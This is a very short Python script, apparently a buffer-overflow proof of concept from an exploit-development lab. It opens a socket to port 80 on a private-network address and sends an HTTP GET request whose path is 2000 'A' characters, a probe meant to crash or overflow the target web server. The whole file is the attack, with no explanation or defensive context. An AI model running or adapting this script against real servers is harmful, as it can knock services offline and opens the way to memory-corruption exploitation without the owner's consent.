import socket

buf = "GET "
buf += "A" * 2000
buf += " HTTP/1.1\r\n\r\n"

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.61.148',80))
s.send(buf)
s.close()
